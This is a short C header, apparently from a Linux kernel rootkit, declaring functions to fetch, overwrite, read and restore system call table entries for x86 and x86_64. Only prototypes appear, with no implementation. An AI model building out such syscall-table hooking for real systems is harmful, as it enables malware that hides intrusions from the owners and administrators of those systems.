#ifndef ROOTKIT_SYSCALL_TBL_H
# define ROOTKIT_SYSCALL_TBL_H

# include <uapi/asm/unistd_64.h>

enum syscall_mode {
    x86 = 1,
    x86_64 = 2,
};

int syscall_tbl_fetch(enum syscall_mode m);
void syscall_tbl_set(int n, void *fct, enum syscall_mode m);
unsigned long syscall_tbl_get(int n, enum syscall_mode m);
unsigned long syscall_tbl_orig(int n, enum syscall_mode m);
void syscall_tbl_restore(int n, enum syscall_mode m);
void syscall_tbl_restore_all(enum syscall_mode m);

#endif /* !ROOTKIT_SYSCALL_TBL_H */
